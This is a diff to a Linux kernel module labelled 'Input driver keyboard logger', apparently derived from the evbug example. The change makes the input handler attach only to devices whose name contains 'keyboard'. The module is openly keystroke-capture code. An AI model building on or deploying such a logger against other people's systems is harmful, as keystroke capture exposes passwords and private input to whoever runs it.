@@ -29,15 +29,13 @@ MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Input driver keyboard logger");
 
+const char *kbdstr = "keyboard";
+
 static int kbdlogger_connect(struct input_handler *handler, struct input_dev *dev,
 		const struct input_device_id *id)
 {
 	struct input_handle *handle;
 	int error;
-
-	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
-	if (!handle)
-		return -ENOMEM;
 
 	/*
 	 * TODO: Write here a if to filter out input devices that are not
@@ -46,22 +44,30 @@ static int kbdlogger_connect(struct input_handler *handler, struct input_dev *de
 	 * SEE: include/linux/device.h (struct device)
 	 *      include/linux/input.h  (struct input_dev)
 	 */
-	handle->dev = dev;
-	handle->handler = handler;
-	handle->name = "evbug";
-	error = input_register_handle(handle);
 
-	if (error)
-		goto err_free_handle;
+	if (strstr(dev->name, kbdstr)) {
 
-	error = input_open_device(handle);
-	if (error)
-		goto err_unregister_handle;
+		handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
+		if (!handle)
+			return -ENOMEM;
 
-	printk(KERN_DEBUG pr_fmt("Connected device: %s (%s at %s)\n"),
-		dev_name(&dev->dev),
-		dev->name ?: "unknown",
-		dev->phys ?: "unknown");
+		handle->dev = dev;
+		handle->handler = handler;
+		handle->name = "evbug";
+		error = input_register_handle(handle);
+
+		if (error)
+			goto err_free_handle;
+
+		error = input_open_device(handle);
+		if (error)
+			goto err_unregister_handle;
+
+		printk(KERN_DEBUG pr_fmt("Connected device: %s (%s at %s)\n"),
+			dev_name(&dev->dev),
+			dev->name ?: "unknown",
+			dev->phys ?: "unknown");
+	}
 
 	return 0;
 
